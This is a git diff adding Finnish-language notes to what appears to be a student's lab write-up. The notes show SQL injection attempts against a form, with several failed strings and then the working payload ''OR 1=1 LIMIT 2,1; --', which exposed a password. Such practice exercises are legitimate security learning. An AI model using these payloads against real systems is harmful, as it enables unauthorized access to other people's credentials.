@@ -38,6 +38,30 @@ Index.html tiedostosta löytyi kohta missä on input type="number". Jätin type 
 
 ![image](https://github.com/user-attachments/assets/1d7b4773-2819-45e7-8a1c-878bbd161f37)
 
+Testi toimiiko kirjoitus: ![image](https://github.com/user-attachments/assets/1ba1dea4-9974-4f58-a346-88a6cdd39608)
+
+Sehän toimii joten aloitetaan testailu.
+
+    
+    'OR1=1-- LIMIT 1,2; (muut limitit)
+    123'OR 1=1-- LIMIT 1,2; (muut limitit)
+    foo'OR 1=1 LIMIT 1,2; (muut limitit)
+    
+Ja lukuisten muiden yritysten jälkeen löysin oikean:
+
+    'OR 1=1 LIMIT 2,1; --
+
+![image](https://github.com/user-attachments/assets/f6b69029-c8f2-464a-af51-4cc04588ef7b)
+
+Kuvan yläpuolella näkyy salasana.
+
+
+
+    
+
+    
+
+
 
 
 
